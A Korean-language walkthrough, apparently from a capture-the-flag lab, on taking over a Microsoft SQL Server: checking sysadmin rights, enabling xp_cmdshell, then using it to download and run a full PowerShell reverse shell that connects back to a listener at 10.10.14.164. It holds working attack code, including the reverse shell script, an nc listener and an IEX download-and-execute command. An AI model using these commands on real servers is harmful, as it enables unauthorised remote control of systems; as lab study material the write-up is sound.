mssql
#
접속환경 : [impacket mssql](https://github.com/sjcode101/cheat-sheet/blob/master/scripts/smb.md)

```
SQL> help
```
![image](https://user-images.githubusercontent.com/61821641/148949558-530742c1-cb4c-4eb9-a22f-0a18270eac1a.png)

권한(role) 확인
```
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
```
![image](https://user-images.githubusercontent.com/61821641/148955051-f2b02a34-30c9-45c3-9050-aefdca191ef2.png)

참이면 출력하지 않고 거짓이면 "NULL"을 출력한다.
위 결과는 가장 높은 권한(관리자)을 얻음을 의미한다.

windows 명령 셸을 얻기 위해 mssql 의 프로시저인
 `xp_cmdshell`이 이미 활성화되어 있는지 확인(default는 비활성화)
```
SQL> EXEC xp_cmdshell 'net user';
```

![image](https://user-images.githubusercontent.com/61821641/148952405-39245470-ec31-45b0-84b3-c4d6337672c6.png)

비활성화 되어있고 sp_configure를 사용하여 활성화시킬 수 있다고 적혀있다.

xp_cmdshell 활성화 진행

sp_configure를 사용하여 일부 전역 서버를 수정한다.
구문은 다음과 같다.
```
sp_configure [ @configname = ] 'hadoop connectivity',  
             [ @configvalue = ] { 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 }

--[ @configname= ] ' option_name ': 구성 옵션의 이름이다. option_name 은 varchar(35) 이며 기본값은 NULL이다.
--[ @configvalue= ] ' 값 ': 새 구성 설정이다. 값 은 int 이며 기본값은 NULL이다.
```
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```
고급 옵션 표시를 사용
일부 구성을 변경한 후 `RECONFIGURE`를 사용하여 변경사항을 적용한다.

```
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

![image](https://user-images.githubusercontent.com/61821641/148952182-9d50f06b-8a00-4918-b112-ae21c302de45.png)

```
SQL> xp_cmdshell "whoami"
```
![image](https://user-images.githubusercontent.com/61821641/148952813-c22839fd-80b9-436f-836a-34ab650b152b.png)

SQL Server가 Windows 내에서 해당 사용자(archetype\sql_svc)와 함께 실행되고 있음을 의미한다.

shell.ps1 코드 작성
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.164",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "# ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()};
$client.Close()
```

한 창에서 python 웹서버를 시작한다.
```
python3 -m http.server 80
```
다른창에선 포트 443에서 수신대기하는 netcat 리스너를 생성한다.
```
nc -nlvp 443
```

방화벽에 규칙을 추가해야할 수 있다.
```
ufw allow from 10.129.12.10 proto tcp to any port 80,443
```

powershell 사용

```
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.164/shell.ps1\");"
```
열어놨던 서버에서 연결응답이 왔다.

![image](https://user-images.githubusercontent.com/61821641/148970648-abb1cfef-4752-4a3b-99ea-1c80e81ac61a.png)

![image](https://user-images.githubusercontent.com/61821641/148971041-c7b5b58f-615d-477e-b888-faa1b2124df4.png)
#
